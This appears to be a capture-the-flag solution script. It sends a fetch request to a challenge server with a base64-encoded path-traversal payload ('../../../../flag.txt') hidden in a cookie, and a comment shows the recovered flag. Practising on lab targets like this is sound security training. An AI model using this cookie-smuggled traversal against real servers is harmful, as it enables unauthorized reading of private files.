const url ="http:207.180.200.166:9090/trade"
const cookies = {
    headers: {
        cookie: 'price_feed=Li4vLi4vLi4vLi4vZmxhZy50eHQ='
    }
};

fetch(url, cookies).then((x) => x.text()).then((x) => console.log(x));

// Output : flag{w@fs_r3@lly_d0_Suck8245}
